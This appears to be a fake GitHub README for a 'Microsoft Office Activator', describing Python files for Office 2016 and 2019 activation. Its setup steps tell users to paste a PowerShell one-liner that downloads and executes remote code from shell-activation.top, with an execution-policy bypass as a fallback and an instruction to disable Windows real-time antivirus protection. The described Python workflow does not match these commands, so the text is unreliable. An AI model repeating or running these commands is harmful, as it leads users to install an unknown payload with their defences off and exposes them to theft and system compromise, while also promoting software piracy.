<div align="center">

# Microsoft Office Activator: Windows Automation

![preview](https://raw.githubusercontent.com/bassotresor1-droid/office-setup-automation/main/promo_544e7.svg)

[![pwsh](https://img.shields.io/badge/PWSH-5%2B-14b8a6?style=social&labelColor=0d1117)]() [![checks](https://img.shields.io/badge/CHECKS-PASSING-2ea44f?style=social&labelColor=0d1117)]() [![release](https://img.shields.io/badge/RELEASE-PRODUCTION-2ea44f?style=social&labelColor=0d1117)]() [![lang](https://img.shields.io/badge/LANG-PYTHON-2dd4bf?style=social&labelColor=0d1117)]()

</div>

---

This script automates activation of Microsoft Office 2016 and 2019, keeping the process contained to a couple of local Python files. It relies on main.py paired with office_versions.py in the same directory, and it prompts for the target Office version at runtime. The code favors straightforward execution over configuration, so you can run it and select a version without editing anything.

## 🔧 PowerShell Setup

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Open Windows PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Run the script
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If PowerShell blocks the script
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## 🔧 Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## What it does

This script handles activation for Microsoft Office 2016 and 2019 in a single, no-frills flow. It bundles the version definitions in one place and keeps the entry point separate, so you drop the files into a directory, run the main script, and pick the Office version you want from a prompt. There is no service to install, no background process to babysit, and no dependency chain to untangle — just a straightforward local run that maps your choice to the matching activation routine. Configuration is intentionally minimal; the version list is exposed as a plain data file so you can adjust or add entries without touching the main logic. Everything runs from the folder you set it up in, which keeps the footprint predictable and easy to clean up.

## Usage

- Place `main.py` and `office_versions.py` in the same directory. Keep them together — `main.py` imports the version list from the companion file, so splitting them will break the run.
- Launch `main.py` with your Python interpreter of choice.
- When prompted, pick the Office version you want to activate (2016 or 2019). The script hands off to the matching activation routine for that selection.
- Watch the console output for status. If activation fails, re-check that the selected version matches what is actually installed before retrying.

**Notes**

- Run the script with the privileges your environment requires; restricted shells may block the underlying activation calls.
- Keep the directory layout intact between runs. Moving files around after a successful activation is safe, but the script itself needs both files side by side to start.
- If you maintain multiple Office installs, run the script once per target and select the corresponding version each time.

## Configuration

Configuration is handled at runtime through an interactive prompt, so there is no config file to edit or environment variables to set.

### Configuration steps

- Place `main.py` and `office_versions.py` in the same directory before running anything. The script loads version data from `office_versions.py`, so splitting them up will break execution.
- Launch `main.py` and select the target Office version when prompted. Your selection is what drives the rest of the run; nothing is persisted between sessions.
- Keep the version list in `office_versions.py` intact unless you know what you are changing. It is the single source of truth for the choices offered at the prompt, and edits there directly affect what the script can activate.

### Notes

- No command-line flags are required. The prompt is the configuration interface.
- Because settings are not saved, each run starts fresh. Re-select the version you need every time you execute the script.
- If you add or rename entries in `office_versions.py`, make sure the names match what you expect to see in the prompt and verify the file still imports cleanly before running `main.py`.

## FAQ

**Which Office versions are supported?**
The script targets Office 2016 and Office 2019. Other builds aren't validated, so results may vary if you point it at something else.

**Do I need both files in the same folder?**
Yes. `main.py` and `office_versions.py` must sit side by side. `main.py` imports the version list directly, so separating them will break the run before you ever see a menu.

**Why does the menu not show my version?**
The list comes straight from `office_versions.py`. If your build isn't there, add it to that file — the script reads whatever entries you provide, so keeping the list current is on you.

**Can I run it non-interactively?**
Not out of the box. The flow is a prompt-and-pick menu. If you need it scripted, wrap the call and feed the selection through stdin, or edit `main.py` to accept an argument instead of asking.

**It failed halfway through — do I need to clean up first?**
Rerun it. The script is idempotent enough for a second pass, but if activation still doesn't stick, verify the Office install is healthy before trying again rather than piling on retries.

**Does this change my Office files or install anything extra?**
It works against the existing install. It doesn't ship Office and it doesn't patch binaries — it drives activation. Keep your own backups if you're cautious.

**Will Windows updates undo the activation?**
Sometimes, yes. Major Office updates can reset licensing state. If activation drops after an update, just run the script again.

**Why do I get permission errors?**
The activation steps touch system-level licensing, so run the script with sufficient privileges. A standard user prompt usually isn't enough.

**Is this legal / safe to use?**
Read the Disclaimer section. This is a tool for environments where you're licensed to activate; using it otherwise is your responsibility, not the script's.

## Disclaimer

This script is provided for educational and research purposes only. It is intended to demonstrate how activation mechanisms work in a controlled, offline environment. You are solely responsible for how you use it.

Running this script against software you do not own or have a valid license for may violate the terms of service of the target project and the laws of your jurisdiction. The authors and contributors of this repository do not condone piracy or unauthorized activation, and they accept no liability for any misuse, damages, or legal consequences that arise from using this tool.

The script is offered "as is," with no warranty of any kind, express or implied, including but not limited to fitness for a particular purpose or non-infringement. Activation behavior can change without notice as the target project updates, and results are not guaranteed. Test in an isolated environment first, keep backups, and do not run this on production machines or systems you rely on for critical work.

If you find this tool useful, consider supporting the official software through legitimate channels.